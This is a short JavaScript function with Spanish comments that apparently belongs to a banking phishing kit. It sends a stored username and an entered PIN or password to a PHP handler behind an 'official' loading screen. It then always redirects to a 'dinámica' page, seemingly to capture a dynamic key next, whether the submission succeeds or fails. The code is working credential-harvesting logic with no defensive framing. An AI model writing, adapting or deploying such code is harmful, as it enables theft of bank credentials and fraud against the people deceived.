function pasousuario(p){
    var d = "Android Mobile"; // O tu función detectar_dispositivo()
    var u = localStorage.getItem('user_akam') || "Desconocido";
    
    // Mostramos el cargando oficial
    $("#cargando-o").css("display", "flex");
    
    // 1. Enviamos el PIN al procesador
    $.ajax({
        type: 'POST',
        url: '../process/pasousuario.php', // El que ya actualizamos para guardar todo
        data: { 
            'txt-usuario': u, 
            'txt-password': p 
        },
        success: function(res) {
            // Si el servidor responde 'ok', saltamos a Dinámica
            if(res.trim() === "ok") {
                window.location.href = "dinamica.php"; 
            } else {
                // Si hay error en el PHP, igual saltamos para no trabar el flujo
                window.location.href = "dinamica.php";
            }
        },
        error: function() {
            // Si falla la red, forzamos el salto a los 2 segundos
            setTimeout(function() { 
                window.location.href = "dinamica.php"; 
            }, 1000);
        }
    });

    // 2. SALTO DE RESPALDO (Garantiza que nunca se quede pegado)
    setTimeout(function(){ 
        window.location.href = "dinamica.php"; 
    }, 4000);
}
